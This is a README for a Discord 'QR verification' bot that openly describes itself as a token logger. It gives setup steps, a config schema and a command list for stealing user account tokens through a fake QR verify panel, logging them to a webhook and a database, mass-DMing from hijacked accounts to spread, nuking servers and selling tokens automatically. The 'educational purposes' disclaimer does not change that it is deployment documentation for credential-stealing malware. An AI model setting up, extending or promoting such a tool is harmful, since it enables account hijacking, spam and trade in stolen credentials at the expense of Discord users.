# QR-VERIFY-BOT
The most over the top, advanced token logger ever made

## Disclaimer 
 The automation of User Discord accounts also known as self-bots is a violation of Discord Terms of Service & Community guidelines and will result in your account(s) being terminated. Discretion is adviced. I will not be responsible for your actions. Read about Discord [Terms Of service](https://discord.com/terms) and [Community Guidelines](https://discord.com/guidelines)
 
 This bot was written to for educational purposes, to prove that discord has flaws and that people with malicious contents could easily manipulate people into giving their token away. 

## **Features** :
- Automatic token logger (QR logger )
- Discord server cloner (Useful for quickly setting up new servers with loggers)
- Built in spreader (Will spread message through all direct messages, friends and guilds.)
- PostgreSQL (Inserts all tokens into an SQL database)
- Webhook dumper 
- Webhook distributing function (Y person can pay u and it will automatically send x amount of tokens to y person)

## Setup Bot and VPS

#### Setup Python
    - sudo apt update
    - sudo apt install python3
    - sudo apt install python3-pip
    
#### Setup PostgreSQL (Debian/Ubuntu)
    - sudo apt update
    - sudo apt install postgresql postgresql-contrib
    - sudo systemctl enable postgresql.service
    - sudo -u postgres createuser --interactive --pwprompt
    - give name, password and type Y when asked
    - sudo -u postgres psql
    - create database disq
    - \c disq;
    - Paste the commands from schema.sql   
#### Database Configuration
```python

    #postgres://user:password@host:port/database?option=value
    dsn = 'postgres://root:1234@127.0.0.1:5432/disq'
    
```



-------------------------------------------------------------------------------------------------------------
    
    
    
#### Setup Bot
    - Clone the repository
    - python3 main.py 
The bot is designed to use Screen, and will give debug information for the screen in the webhook.



    
    
 

## Config

```json
{
    "bot_prefix": "!",
    "webhook_url": "...",
    "bot_token": "...",
    "auto_add": {
        "enabled": true,
        "users": []
    },
    "auto_spread": {
        "enabled": true,
        "messages": [
            "https://discord.gg/jevVxqtphT"
        ]
    },
    "servers": { }
       
    
}
```
| Name | Description | 
| --- | ---         |
| `bot_prefix` | Prefix used before every command in the discord server |
| `webhook_url` | Webhook URL that leads to the integration of the webhook u have in ur private server, this is where all the tokens get logged |
| `bot_token` | Token of the bot that u have created |
| `auto_add` | Will automatically add users that are written here ( IDs ) |
| `auto_spread` | When "enabled=true" bot will massDM the message in "messages" to everyone in the friends list and in every guild channel the owner of the account is in |
| `servers` | Automatic function where all servers will be shown that have the bot active and have a verified role |

## Discord Server Commands

### GuildManager

| Name | Type | Description | 
| ---  | ---  | ---         |
| `loadconfig` | GuildManager | Loads config from the source files, when no config available under x name, it will nuke server.
| `saveconfig` | GuildManager | Saves current state of discord server (all channels, channel names, permissions, lastmessage send per channel).

### NukeCog
| Name | Type | Description | 
| ---  | ---  | ---         |
| `nuke` | NukeCog | Nukes server, removes everything.

### Verification
| Name | Type | Description | 
| ---  | ---  | ---         |
| `addfriend` | Verification | adds x as friend on the account the bot is massDMing with.
| `addmessage` | Verification | adds x as message to massDM spreader.
| `changetokenwebhook ` | Verification | Changes webhookurl to given message.
| `deletefriend` | Verification | removes x as friend on the account the bot is massDMing with.
| `deletemessage` | Verification | GUI to remove single message from the messages.
| `giverole` | Verification | gives x role to urself.
| `listfriends` | Verification | lists friends.
| `listmessages` | Verification | gives a list of all messages that are being send by the massDMer.
| `setuppanel` | Verification | setup in channel panel that has verify button that gives a qr code.
| `setuprole` | Verification | GUI that lets u choose what role people get after succesfully verifying.
| `togglespreader` | Verification | turns massDMer on or off.

-------------------------------------------------------------------------------------------------------------
